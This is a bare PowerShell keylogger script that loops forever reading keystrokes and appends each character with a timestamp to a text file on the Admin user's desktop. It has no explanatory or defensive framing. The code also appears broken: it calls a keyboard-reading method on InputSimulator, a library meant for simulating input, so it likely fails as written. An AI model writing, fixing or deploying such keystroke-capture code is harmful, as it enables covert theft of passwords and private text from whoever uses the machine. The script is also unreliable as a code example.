Add-Type -AssemblyName WindowsInput

$LogFile = "C:\Users\Admin\Desktop\keylog.txt"

Function LogKeys {
    $Simulator = New-Object WindowsInput.InputSimulator

    while ($true) {
        $Key = $Simulator.Keyboard.ReadKey()
        $Char = $Key.KeyChar
        if ($Char -ne "`0") {
            Add-Content -Path $LogFile -Value "$([DateTime]::Now.ToString('yyyy-MM-dd HH:mm:ss')) - $Char"
        }
    }
}

LogKeys